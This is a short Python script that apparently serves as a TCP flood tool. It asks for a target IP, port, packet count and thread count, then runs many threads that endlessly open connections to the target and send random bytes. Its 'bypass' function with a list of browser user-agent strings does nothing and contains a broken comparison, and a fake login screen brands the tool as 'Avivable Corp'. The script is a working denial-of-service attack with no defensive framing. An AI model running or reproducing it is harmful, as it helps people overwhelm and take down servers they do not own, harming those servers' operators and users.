import os
import socket
import random
import threading
import ctypes
import sys

gray = '\033[1;30;40m'
red = '\033[1;31;40m'
green = '\033[1;32;40m'
yellow = '\033[1;33;40m'
blue = '\033[1;34;40m'
magenta = '\033[1;35;40m'
cyan = '\033[1;36;40m'
white = '\033[1;37;40m'

def bypass():
	bypass = True
	if bypass == True:
		try:
			browser == ['Chrome, Brave, Opera, Safari, Firefox']
			uagents = []
			uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
			uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
			uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
			uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
			uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
			uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
			uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
			uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
			return uagents
		except:
			pass

def login():
	os.system('cls' if os.name == 'nt' else 'clear')
	username = input(magenta + 'Username: ' + cyan + '')
	os.system('cls' if os.name == 'nt' else 'clear')
	ctypes.windll.kernel32.SetConsoleTitleW('Hello, ' + username + ' | Avivable Corp | Servers: NULL | Nodes: NULL')

login()

ip = str(input(white + '[+] Target: ' + cyan + ''))
port = int(input(white + '[+] Port: ' + cyan + ''))
pack = int(input(white + '[+] Packet/s: ' + cyan + ''))
thread = int(input(white + '[+] Threads: ' + cyan + ''))

def start():
	hh = random._urandom(10)
	xx = int(0)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(hh)
			for i in range(pack):
				s.send(hh)
			xx += 1
		except:
			s.close()

for x in range(thread):
	thred = threading.Thread(target=start)
	thred.start()
